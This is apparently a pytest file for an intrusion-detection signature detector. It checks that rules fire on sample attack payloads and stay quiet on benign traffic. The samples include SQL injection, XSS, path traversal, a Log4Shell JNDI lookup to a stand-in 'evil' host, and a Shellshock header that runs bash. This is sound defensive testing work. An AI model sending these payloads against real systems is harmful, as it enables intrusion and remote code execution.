import pytest

from mini_ids.detectors.signatures import SignatureDetector
from tests.conftest import pkt

ATTACKS = [
    (1000001, 80, b"GET /p.php?id=1%20UNION%20SELECT%20user,pass%20FROM%20users HTTP/1.1"),
    (1000002, 80, b"GET /login?u=admin'%20OR%201=1-- HTTP/1.1"),
    (1000003, 80, b"GET /s?q=<script>alert(1)</script> HTTP/1.1"),
    (1000004, 80, b"GET /dl?f=../../../etc/hosts HTTP/1.1"),
    (1000006, 80, b"GET / HTTP/1.1\r\nX-Api: ${jndi:ldap://evil/a}\r\n"),
    (1000007, 80, b"GET / HTTP/1.1\r\nUser-Agent: () { :; }; /bin/bash -c id\r\n"),
    (1000008, 80, b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.8\r\n"),
    (1000101, 21, b"PASS hunter2\r\n"),
    (1000204, 3333, b'{"method":"mining.subscribe"}'),
]


@pytest.fixture
def det(cfg):
    return SignatureDetector(cfg)


@pytest.mark.parametrize("sid,port,payload", ATTACKS)
def test_rule_matches_attack(det, sid, port, payload):
    alerts = list(det.process(pkt(dport=port, flags="PA", payload=payload, src="198.51.100.9",
                                  dst="192.168.1.10")))
    assert sid in {a.evidence["sid"] for a in alerts}


BENIGN = [
    b"GET /products.php?id=3 HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
    b"POST /api/items HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"name\":\"selection\"}",
    b"GET /docs/union-station-select-menu HTTP/1.1\r\n",
]


@pytest.mark.parametrize("payload", BENIGN)
def test_benign_http_is_quiet(det, payload):
    assert list(det.process(pkt(dport=80, flags="PA", payload=payload))) == []


def test_port_rule_fires_on_syn_only(det):
    # rule 4444 không cần payload → chỉ báo ở gói SYN mở kết nối, không báo mọi gói
    syn = pkt(src="192.168.1.66", dst="203.0.113.44", dport=4444, flags="S")
    data = pkt(src="192.168.1.66", dst="203.0.113.44", dport=4444, flags="PA", payload=b"x")
    assert {a.evidence["sid"] for a in det.process(syn)} == {1000201}
    assert list(det.process(data)) == []


def test_home_net_direction(det):
    # SMB từ trong ra ngoài → báo; SMB nội bộ → không
    out = pkt(src="192.168.1.20", dst="8.8.4.4", dport=445)
    inside = pkt(src="192.168.1.20", dst="192.168.1.10", dport=445)
    assert 1000205 in {a.evidence["sid"] for a in det.process(out)}
    assert list(det.process(inside)) == []
